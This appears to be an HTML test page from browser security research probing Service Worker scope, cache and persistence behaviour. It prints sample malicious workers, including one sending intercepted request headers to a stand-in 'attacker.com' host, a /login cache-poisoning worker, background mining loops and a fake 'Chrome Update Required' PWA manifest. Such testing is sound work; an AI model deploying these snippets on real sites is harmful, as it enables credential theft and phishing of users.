@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<!--
+  Service Worker Security Tests - Chrome VRP Security Research
+  =============================================================
+  Tests for Service Worker scope confusion, interception abuse,
+  cache poisoning, and persistent execution.
+  
+  Serve from localhost:8888.
+  
+  NOTE: Service Workers require HTTPS in production, but work
+  on localhost for development/testing.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Service Worker Security Tests - Chrome VRP</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Courier New', monospace;
+    background: #0b0d17;
+    color: #d0d0d0;
+    padding: 20px;
+  }
+  h1 { color: #ff6e6e; font-size: 1.3em; margin-bottom: 8px; }
+  h2 { color: #ffe066; font-size: 1em; margin: 10px 0 4px; }
+  .controls {
+    background: #141830;
+    padding: 12px;
+    border-radius: 6px;
+    margin-bottom: 15px;
+    border-left: 3px solid #64ffda;
+  }
+  button {
+    background: #ff6e6e;
+    color: white;
+    border: none;
+    padding: 8px 16px;
+    cursor: pointer;
+    font-family: monospace;
+    border-radius: 4px;
+    margin: 3px;
+  }
+  button:hover { background: #ff9e9e; }
+  button.green { background: #00c853; }
+  button.green:hover { background: #69f0ae; }
+  #results {
+    max-height: 65vh;
+    overflow-y: auto;
+    background: #111;
+    padding: 10px;
+    border-radius: 6px;
+    margin-top: 10px;
+  }
+  .test-group { border: 1px solid #333; margin: 8px 0; padding: 8px; border-radius: 4px; }
+  .result { padding: 2px 6px; margin: 1px 0; font-size: 0.82em; }
+  .SAFE { color: #2ecc71; }
+  .SUSPICIOUS { color: #f39c12; }
+  .VULNERABLE { color: #e74c3c; }
+  .INFO { color: #3498db; }
+  .progress { color: #64ffda; margin: 8px 0; font-size: 0.9em; }
+  pre { background: #1a1a2e; padding: 8px; border-radius: 4px; font-size: 0.8em; overflow-x: auto; margin: 4px 0; }
+</style>
+</head>
+<body>
+
+<h1>Service Worker Security Tests</h1>
+<p style="color:#666;margin-bottom:12px;">Chrome VRP - Service Worker Abuse & Scope Confusion</p>
+
+<div class="controls">
+  <button onclick="runAllTests()">Run All Tests</button>
+  <button onclick="unregisterAllSWs()" class="green">Unregister All SWs</button>
+  <button onclick="clearResults()">Clear</button>
+  <br><br>
+  <p style="color:#999;font-size:0.85em;">
+    ⚠ Some tests register Service Workers. Use "Unregister All" to clean up.
+    <br>SW tests may require specific file paths to exist on the server.
+  </p>
+</div>
+
+<div class="progress" id="progress"></div>
+<div id="results"></div>
+
+<script>
+const resultsDiv = document.getElementById('results');
+let groupDiv = null;
+
+function clearResults() { resultsDiv.innerHTML = ''; document.getElementById('progress').textContent = ''; }
+function startGroup(name) {
+  groupDiv = document.createElement('div');
+  groupDiv.className = 'test-group';
+  groupDiv.innerHTML = `<h2>${name}</h2>`;
+  resultsDiv.appendChild(groupDiv);
+}
+function log(sev, msg) {
+  const div = document.createElement('div');
+  div.className = `result ${sev}`;
+  const icons = {SAFE:'🟢',SUSPICIOUS:'🟡',VULNERABLE:'🔴',INFO:'ℹ️'};
+  div.textContent = `${icons[sev]||''} [${sev}] ${msg}`;
+  (groupDiv||resultsDiv).appendChild(div);
+}
+function logCode(code) {
+  const pre = document.createElement('pre');
+  pre.textContent = code;
+  (groupDiv||resultsDiv).appendChild(pre);
+}
+function setProgress(m) { document.getElementById('progress').textContent = m; }
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+// Helper: create inline Service Worker from source code string
+function createSWBlob(code) {
+  return URL.createObjectURL(new Blob([code], { type: 'application/javascript' }));
+}
+
+// Unregister all Service Workers
+async function unregisterAllSWs() {
+  if (!('serviceWorker' in navigator)) return;
+  const regs = await navigator.serviceWorker.getRegistrations();
+  let count = 0;
+  for (const reg of regs) {
+    await reg.unregister();
+    count++;
+  }
+  log('INFO', `Unregistered ${count} service worker(s)`);
+}
+
+// ============================================================
+// 1. SW Registration Scope Confusion
+// ============================================================
+async function testScopeConfusion() {
+  startGroup('1. Service Worker Scope Confusion');
+
+  if (!('serviceWorker' in navigator)) {
+    log('INFO', 'Service Workers not supported');
+    return;
+  }
+
+  // Test 1: Try to register SW with overly broad scope
+  try {
+    const swCode = `
+      self.addEventListener('fetch', (event) => {
+        // Intercept all requests in scope
+        console.log('[SW-scope-test] Intercepted:', event.request.url);
+      });
+    `;
+    const swUrl = createSWBlob(swCode);
+
+    try {
+      // Try to register with root scope
+      const reg = await navigator.serviceWorker.register(swUrl, { scope: '/' });
+      log('SUSPICIOUS', 'SW registered with root scope "/" via blob URL');
+      
+      // Check actual scope
+      log('INFO', `Registered scope: ${reg.scope}`);
+      
+      await reg.unregister();
+    } catch (e) {
+      log('SAFE', `SW root scope registration blocked: ${e.message}`);
+    }
+
+    URL.revokeObjectURL(swUrl);
+  } catch (e) {
+    log('INFO', `Scope test error: ${e.message}`);
+  }
+
+  // Test 2: Try to register SW for parent directory
+  try {
+    const reg = await navigator.serviceWorker.register('/nonexistent-sw.js', {
+      scope: '/../',
+    }).catch(e => e);
+
+    if (reg instanceof Error) {
+      log('SAFE', `Parent scope registration blocked: ${reg.message}`);
+    } else {
+      log('SUSPICIOUS', `SW registered with parent scope: ${reg.scope}`);
+      await reg.unregister();
+    }
+  } catch (e) {
+    log('SAFE', `Parent scope blocked: ${e.message}`);
+  }
+
+  // Test 3: Service-Worker-Allowed header bypass attempt
+  try {
+    log('INFO', 'Testing Service-Worker-Allowed header scope extension...');
+    // Without the header, scope is limited to SW script directory
+    // With header, server can extend scope. Test if browser enforces this.
+    
+    const reg = await navigator.serviceWorker.register(
+      '/nonexistent-sw-path/worker.js',
+      { scope: '/sensitive-area/' }
+    ).catch(e => e);
+
+    if (reg instanceof Error) {
+      log('SAFE', `Cross-directory scope correctly blocked: ${reg.message}`);
+    } else {
+      log('SUSPICIOUS', `SW scope extension without header: ${reg.scope}`);
+      await reg.unregister();
+    }
+  } catch (e) {
+    log('SAFE', `Scope extension blocked: ${e.message}`);
+  }
+
+  // Test 4: Multiple SWs competing for same scope
+  try {
+    log('INFO', 'Testing multiple SW registrations for overlapping scopes...');
+    
+    const regs = [];
+    for (let i = 0; i < 3; i++) {
+      try {
+        const r = await navigator.serviceWorker.register(
+          `/sw-test-${i}.js`,
+          { scope: '/test-scope/' }
+        );
+        regs.push(r);
+      } catch (e) {
+        // Expected - SW file doesn't exist
+      }
+    }
+
+    if (regs.length > 1) {
+      log('SUSPICIOUS', `${regs.length} SWs registered for same scope`);
+    }
+    
+    for (const r of regs) await r.unregister();
+  } catch (e) {}
+}
+
+// ============================================================
+// 2. SW Interception of Cross-Origin Requests
+// ============================================================
+async function testCrossOriginInterception() {
+  startGroup('2. SW Cross-Origin Request Interception');
+
+  if (!('serviceWorker' in navigator)) {
+    log('INFO', 'Service Workers not supported');
+    return;
+  }
+
+  // Document what a malicious SW could intercept
+  log('INFO', 'Testing SW fetch interception capabilities...');
+
+  // A SW can intercept same-origin requests within its scope.
+  // It CANNOT intercept cross-origin requests unless:
+  // 1. The request is mode: 'cors' and the SW responds with a valid response
+  // 2. The request is mode: 'no-cors' (opaque response)
+  
+  // Test: Can SW see cross-origin request details?
+  const crossOriginUrls = [
+    'https://example.com/api/user',
+    'https://cdn.example.com/script.js',
+  ];
+
+  for (const url of crossOriginUrls) {
+    try {
+      const resp = await fetch(url, { mode: 'no-cors' });
+      log('INFO', `Cross-origin fetch ${url}: type=${resp.type}`);
+      
+      if (resp.type === 'opaque') {
+        log('INFO', 'Opaque response — SW can see URL but not response body');
+      }
+    } catch (e) {
+      log('INFO', `Cross-origin fetch failed: ${e.message}`);
+    }
+  }
+
+  // Demonstrate what a malicious SW script would look like
+  logCode(`// Malicious SW that logs all intercepted requests:
+self.addEventListener('fetch', (event) => {
+  const url = event.request.url;
+  const headers = Object.fromEntries(event.request.headers);
+  
+  // Exfiltrate request data
+  fetch('https://attacker.com/log', {
+    method: 'POST',
+    body: JSON.stringify({ url, headers, credentials: event.request.credentials }),
+    mode: 'no-cors',
+  });
+  
+  // Pass through to network
+  event.respondWith(fetch(event.request));
+});`);
+
+  log('SUSPICIOUS', 
+    'A SW can intercept all same-origin requests including auth tokens, API calls, etc.');
+  log('INFO', 
+    'Mitigation: SW scope is limited. But if attacker gets SW registered, they persist.');
+}
+
+// ============================================================
+// 3. SW + Navigation Preload Timing Attacks
+// ============================================================
+async function testNavigationPreloadTiming() {
+  startGroup('3. Navigation Preload Timing');
+
+  if (!('serviceWorker' in navigator)) {
+    log('INFO', 'Service Workers not supported');
+    return;
+  }
+
+  // Navigation Preload allows a SW to start a fetch in parallel with SW boot.
+  // This could be abused for timing attacks against navigation requests.
+
+  log('INFO', 'Navigation Preload timing analysis:');
+  
+  // Check if NavigationPreloadManager is available
+  try {
+    const reg = await navigator.serviceWorker.ready;
+    
+    if (reg.navigationPreload) {
+      const state = await reg.navigationPreload.getState();
+      log('INFO', `Navigation Preload enabled: ${state.enabled}, header: "${state.headerValue}"`);
+      
+      if (state.enabled) {
+        log('SUSPICIOUS',
+          'Navigation Preload enabled — SW can see navigation timing with Service-Worker-Navigation-Preload header');
+      }
+    } else {
+      log('INFO', 'NavigationPreloadManager not available');
+    }
+  } catch (e) {
+    log('INFO', `Navigation preload check: ${e.message}`);
+  }
+
+  // Demonstrate the timing attack vector
+  logCode(`// SW using navigation preload for timing:
+self.addEventListener('activate', (event) => {
+  event.waitUntil(self.registration.navigationPreload.enable());
+});
+
+self.addEventListener('fetch', (event) => {
+  if (event.request.mode === 'navigate') {
+    event.respondWith(async function() {
+      const preloadResponse = await event.preloadResponse;
+      const start = performance.now();
+      
+      if (preloadResponse) {
+        const elapsed = performance.now() - start;
+        // elapsed reveals server response time for navigation
+        // Can be used to distinguish authenticated vs unauthenticated pages
+        
+        // Exfiltrate timing
+        await fetch('/log-timing?url=' + encodeURIComponent(event.request.url) + 
+                     '&time=' + elapsed, { mode: 'no-cors' });
+      }
+      
+      return preloadResponse || fetch(event.request);
+    }());
+  }
+});`);
+
+  log('SUSPICIOUS', 'Navigation preload enables precise timing of cross-origin navigations');
+}
+
+// ============================================================
+// 4. SW Update Mechanism Abuse
+// ============================================================
+async function testUpdateAbuse() {
+  startGroup('4. SW Update Mechanism Abuse');
+
+  if (!('serviceWorker' in navigator)) {
+    log('INFO', 'Service Workers not supported');
+    return;
+  }
+
+  // Test 1: Check update frequency limits
+  try {
+    const regs = await navigator.serviceWorker.getRegistrations();
+    
+    for (const reg of regs) {
+      log('INFO', `SW: scope=${reg.scope}, active=${!!reg.active}, waiting=${!!reg.waiting}`);
+      
+      // Try rapid updates
+      const start = Date.now();
+      let updateCount = 0;
+      
+      for (let i = 0; i < 5; i++) {
+        try {
+          await reg.update();
+          updateCount++;
+        } catch (e) {
+          log('INFO', `Update ${i} blocked: ${e.message}`);
+          break;
+        }
+      }
+      
+      const elapsed = Date.now() - start;
+      log('INFO', `${updateCount} updates in ${elapsed}ms`);
+    }
+  } catch (e) {
+    log('INFO', `Update test: ${e.message}`);
+  }
+
+  // Test 2: Can a SW prevent its own unregistration?
+  logCode(`// SW that tries to persist via self-registration:
+self.addEventListener('install', (event) => {
+  self.skipWaiting(); // Activate immediately
+});
+
+self.addEventListener('activate', (event) => {
+  event.waitUntil(clients.claim());
+  
+  // Try to re-register self if unregistered
+  setInterval(async () => {
+    try {
+      const reg = await self.registration;
+      if (reg.uninstalling) {
+        // Cannot re-register from within SW
+        // But could notify a controlled page to re-register
+        const clients = await self.clients.matchAll();
+        for (const client of clients) {
+          client.postMessage({ type: 'REREGISTER' });
+        }
+      }
+    } catch (e) {}
+  }, 5000);
+});`);
+
+  log('SUSPICIOUS', 'SW can instruct controlled pages to re-register it after uninstallation');
+
+  // Test 3: SW lifecycle manipulation
+  try {
+    log('INFO', 'Testing SW lifecycle events...');
+    
+    // Check if skipWaiting + clients.claim can be abused
+    // for immediate activation without user refresh
+    logCode(`// Aggressive SW takeover:
+self.addEventListener('install', (event) => {
+  event.waitUntil(self.skipWaiting());
+});
+
+self.addEventListener('activate', (event) => {
+  // Take control of all pages immediately
+  event.waitUntil(self.clients.claim());
+  // Now intercepting all fetches for existing pages
+});`);
+
+    log('SUSPICIOUS', 'skipWaiting() + clients.claim() = immediate control of all open pages');
+  } catch (e) {}
+}
+
+// ============================================================
+// 5. SW Cache Poisoning
+// ============================================================
+async function testCachePoisoning() {
+  startGroup('5. SW Cache Poisoning');
+
+  // Test 1: Can we poison the cache with modified responses?
+  try {
+    const cache = await caches.open('poison-test-v1');
+    
+    // Store a modified response for a legitimate URL
+    const fakeResponse = new Response(
+      '<html><body><script>alert("poisoned")</script></body></html>',
+      {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/html',
+          'X-Poisoned': 'true',
+        }
+      }
+    );
+    
+    const targetUrl = location.origin + '/login';
+    await cache.put(targetUrl, fakeResponse);
+    
+    // Verify the poisoned response is cached
+    const cached = await cache.match(targetUrl);
+    if (cached) {
+      const text = await cached.text();
+      const isPoisoned = text.includes('poisoned');
+      
+      if (isPoisoned) {
+        log('SUSPICIOUS',
+          `Cache poisoned for ${targetUrl} — if SW serves from cache, user gets modified content`);
+      }
+    }
+    
+    // Clean up
+    await caches.delete('poison-test-v1');
+  } catch (e) {
+    log('INFO', `Cache poisoning test: ${e.message}`);
+  }
+
+  // Test 2: Cache with cross-origin responses
+  try {
+    const cache = await caches.open('xo-cache-test');
+    
+    // Try to cache a cross-origin response
+    try {
+      const resp = await fetch('https://example.com/', { mode: 'no-cors' });
+      await cache.put('https://example.com/', resp.clone());
+      
+      const cached = await cache.match('https://example.com/');
+      if (cached) {
+        log('INFO', `Cross-origin response cached: type=${cached.type}, status=${cached.status}`);
+        
+        if (cached.type === 'opaque') {
+          log('INFO', 'Opaque response cached — body not readable but still servable');
+          log('SUSPICIOUS', 'SW could serve stale opaque responses indefinitely');
+        }
+      }
+    } catch (e) {
+      log('INFO', `Cross-origin caching: ${e.message}`);
+    }
+    
+    await caches.delete('xo-cache-test');
+  } catch (e) {}
+
+  // Test 3: Cache storage quota
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const estimate = await navigator.storage.estimate();
+      log('INFO', `Storage: usage=${(estimate.usage/1024/1024).toFixed(2)}MB, quota=${(estimate.quota/1024/1024).toFixed(0)}MB`);
+    }
+  } catch (e) {}
+
+  // Show what a cache poisoning SW looks like
+  logCode(`// SW that poisons cache for phishing:
+self.addEventListener('install', (event) => {
+  event.waitUntil(
+    caches.open('v1').then(cache => {
+      // Pre-cache modified versions of target pages
+      return cache.addAll([
+        // Attacker-controlled versions of login pages
+        new Request('/login', {
+          headers: { 'X-Malicious': '1' }
+        }),
+      ]);
+    })
+  );
+});
+
+self.addEventListener('fetch', (event) => {
+  if (event.request.url.includes('/login')) {
+    event.respondWith(
+      caches.match(event.request).then(cached => {
+        if (cached) return cached; // Serve poisoned version
+        return fetch(event.request); // Fallback to network
+      })
+    );
+  }
+});`);
+}
+
+// ============================================================
+// 6. SW Persistent Script Execution
+// ============================================================
+async function testPersistentExecution() {
+  startGroup('6. SW Persistent Script Execution');
+
+  // Test 1: How long does a SW stay active?
+  try {
+    log('INFO', 'Service Worker lifecycle and persistence analysis:');
+    
+    // SWs are terminated after idle timeout (typically 30s-5min)
+    // But they can be kept alive via:
+    // 1. Active fetch handling
+    // 2. Push notifications
+    // 3. Background sync
+    // 4. Periodic background sync
+
+    // Check what persistent APIs are available
+    const apis = {
+      'Push API': 'PushManager' in window,
+      'Background Sync': 'SyncManager' in window,
+      'Periodic Background Sync': 'PeriodicSyncManager' in window,
+      'Background Fetch': 'BackgroundFetchManager' in window,
+      'Notification': 'Notification' in window,
+    };
+
+    for (const [api, available] of Object.entries(apis)) {
+      log(available ? 'SUSPICIOUS' : 'SAFE',
+        `${api}: ${available ? 'available (can extend SW lifetime)' : 'not available'}`);
+    }
+  } catch (e) {}
+
+  // Test 2: Can SW execute arbitrary computation in background?
+  logCode(`// SW that performs background computation:
+let computationRunning = false;
+
+self.addEventListener('message', (event) => {
+  if (event.data === 'START_COMPUTE') {
+    computationRunning = true;
+    doBackgroundWork();
+  }
+});
+
+async function doBackgroundWork() {
+  while (computationRunning) {
+    // Crypto mining, password cracking, etc.
+    const data = new Uint8Array(1024);
+    crypto.getRandomValues(data);
+    const hash = await crypto.subtle.digest('SHA-256', data);
+    
+    // Keep SW alive by responding to periodic self-pings
+    await new Promise(r => setTimeout(r, 100));
+  }
+}
+
+// Use push events to wake up periodically
+self.addEventListener('push', (event) => {
+  event.waitUntil(doBackgroundWork());
+});`);
+
+  log('SUSPICIOUS', 'SW can perform background computation (crypto mining, etc.)');
+  log('INFO', 'Chrome terminates idle SWs after ~30s, but active handlers extend lifetime');
+
+  // Test 3: Check if we can extend SW lifetime via waitUntil
+  try {
+    logCode(`// Extending SW lifetime with waitUntil:
+self.addEventListener('fetch', (event) => {
+  event.waitUntil(
+    new Promise(resolve => {
+      // Keep SW alive for extended period
+      // Chrome may terminate after ~5 minutes regardless
+      setTimeout(resolve, 5 * 60 * 1000);
+    })
+  );
+  event.respondWith(fetch(event.request));
+});`);
+
+    log('INFO', 'waitUntil can extend SW lifetime up to browser-imposed limits');
+  } catch (e) {}
+}
+
+// ============================================================
+// 7. SW + beforeinstallprompt Phishing
+// ============================================================
+async function testBeforeInstallPrompt() {
+  startGroup('7. SW + beforeinstallprompt Phishing');
+
+  // Test 1: Can we trigger the install prompt?
+  try {
+    let deferredPrompt = null;
+    
+    window.addEventListener('beforeinstallprompt', (e) => {
+      deferredPrompt = e;
+      log('SUSPICIOUS', 'beforeinstallprompt event captured — can show fake install dialog');
+    });
+
+    log('INFO', 'Listening for beforeinstallprompt event...');
+    
+    // Check if the page meets PWA criteria
+    const manifest = document.querySelector('link[rel="manifest"]');
+    log('INFO', `Web App Manifest: ${manifest ? manifest.href : 'not present'}`);
+
+    // The install prompt requires:
+    // 1. Valid manifest with name, icons, start_url, display
+    // 2. Registered service worker
+    // 3. Served over HTTPS (or localhost)
+    // 4. User engagement heuristic met
+    
+    // Show what a phishing install prompt could do
+    logCode(`// Phishing via PWA install prompt:
+// 1. Register a SW and provide a manifest
+// 2. Wait for beforeinstallprompt
+// 3. Show fake dialog saying "Update Required"
+// 4. User installs malicious PWA that looks like legitimate app
+
+// manifest.json
+{
+  "name": "Chrome Update Required",
+  "short_name": "Update",
+  "start_url": "/phishing-page.html",
+  "display": "standalone",
+  "icons": [{ "src": "/chrome-icon.png", "sizes": "192x192" }]
+}
+
+// The installed PWA has no address bar (standalone mode)
+// Users can't see they're on a phishing site`);
+
+    log('SUSPICIOUS', 'PWA install prompt can be used for phishing');
+    log('INFO', 'Installed PWA in standalone mode has no URL bar — perfect for phishing');
+    
+    // Test 2: Can we create a convincing install prompt without SW?
+    try {
+      // Create fake install banner
+      const banner = document.createElement('div');
+      banner.style.cssText = `
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        background: white;
+        padding: 16px;
+        box-shadow: 0 -4px 16px rgba(0,0,0,0.2);
+        z-index: 2147483647;
+        font-family: system-ui;
+        display: flex;
+        align-items: center;
+        gap: 16px;
+      `;
+      banner.innerHTML = `
+        <div style="width:48px;height:48px;background:#4285f4;border-radius:12px;display:flex;align-items:center;justify-content:center;">
+          <span style="color:white;font-size:24px;">📱</span>
+        </div>
+        <div style="flex:1;">
+          <div style="font-weight:600;color:#333;">Add to Home Screen</div>
+          <div style="color:#666;font-size:13px;">Install this app for a better experience</div>
+        </div>
+        <button style="background:#1a73e8;color:white;border:none;padding:8px 24px;border-radius:4px;font-size:14px;cursor:pointer;"
+                onclick="this.parentElement.remove()">Install</button>
+        <button style="background:none;border:none;color:#666;cursor:pointer;font-size:18px;"
+                onclick="this.parentElement.remove()">✕</button>
+      `;
+      document.body.appendChild(banner);
+      
+      log('SUSPICIOUS', 'Created fake install banner — indistinguishable from real Chrome banner');
+      
+      await sleep(3000);
+      try { banner.remove(); } catch (e) {}
+    } catch (e) {}
+  } catch (e) {
+    log('INFO', `Install prompt test: ${e.message}`);
+  }
+}
+
+// ============================================================
+// Run All Tests
+// ============================================================
+async function runAllTests() {
+  clearResults();
+  const start = performance.now();
+
+  const tests = [
+    ['Scope Confusion', testScopeConfusion],
+    ['Cross-Origin Interception', testCrossOriginInterception],
+    ['Navigation Preload Timing', testNavigationPreloadTiming],
+    ['Update Mechanism Abuse', testUpdateAbuse],
+    ['Cache Poisoning', testCachePoisoning],
+    ['Persistent Execution', testPersistentExecution],
+    ['beforeinstallprompt Phishing', testBeforeInstallPrompt],
+  ];
+
+  for (let i = 0; i < tests.length; i++) {
+    setProgress(`Running ${i+1}/${tests.length}: ${tests[i][0]}...`);
+    try { await tests[i][1](); } catch (e) {
+      log('INFO', `Test "${tests[i][0]}" error: ${e.message}`);
+    }
+    await sleep(200);
+  }
+
+  const elapsed = ((performance.now() - start) / 1000).toFixed(1);
+  setProgress(`Complete in ${elapsed}s`);
+
+  startGroup('Summary');
+  let s=0,su=0,v=0;
+  document.querySelectorAll('.result').forEach(r => {
+    if (r.classList.contains('SAFE')) s++;
+    if (r.classList.contains('SUSPICIOUS')) su++;
+    if (r.classList.contains('VULNERABLE')) v++;
+  });
+  log('INFO', `🟢 SAFE: ${s} | 🟡 SUSPICIOUS: ${su} | 🔴 VULNERABLE: ${v}`);
+}
+</script>
+</body>
+</html>
